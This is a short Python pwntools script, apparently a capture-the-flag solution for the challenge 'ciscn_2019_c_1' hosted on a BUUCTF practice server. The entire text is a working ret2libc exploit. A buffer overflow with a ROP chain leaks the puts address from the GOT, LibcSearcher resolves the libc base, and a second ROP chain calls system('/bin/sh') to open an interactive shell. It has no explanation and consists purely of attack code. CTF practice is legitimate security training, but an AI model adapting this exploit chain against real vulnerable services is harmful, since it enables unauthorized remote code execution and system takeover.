from pwn import *
from LibcSearcher import *
context.log_level="debug"
context(arch="amd64",os="linux")

pop_rdi = 0x0000000000400c83
puts_got_addr = 0x602020
puts_plt_addr = 0x4006e0
encrypt_sym_addr = 0x4009A0
ret = 0x4006b9

p = remote("node3.buuoj.cn",28528)
#p=process("./ciscn_2019_c_1")
p.sendline("1")
payload=b'0'*0x50+p64(0)+p64(pop_rdi)+p64(puts_got_addr)+p64(puts_plt_addr)+p64(encrypt_sym_addr)
p.sendline(payload)
p.recvuntil("Ciphertext\n")
p.recvuntil("\n")

GOT_puts=p.recvuntil("\n").split()[0]
print(GOT_puts)
for i in range(len(GOT_puts),8):
	GOT_puts += b'\x00'
GOT_puts = u64(GOT_puts)

libc = LibcSearcher("puts",GOT_puts)
ADDR_LibC_base = GOT_puts - libc.dump("puts")
ADDR_system = ADDR_LibC_base + libc.dump("system")
ADDR_String_Sh = ADDR_LibC_base + libc.dump("str_bin_sh")
payload=b'0'*0x50+p64(0)+p64(ret)+p64(ret)+p64(ret)+p64(ret)+p64(ret)+p64(pop_rdi)+p64(ADDR_String_Sh)+p64(ADDR_system)
p.sendline(payload)

p.interactive()
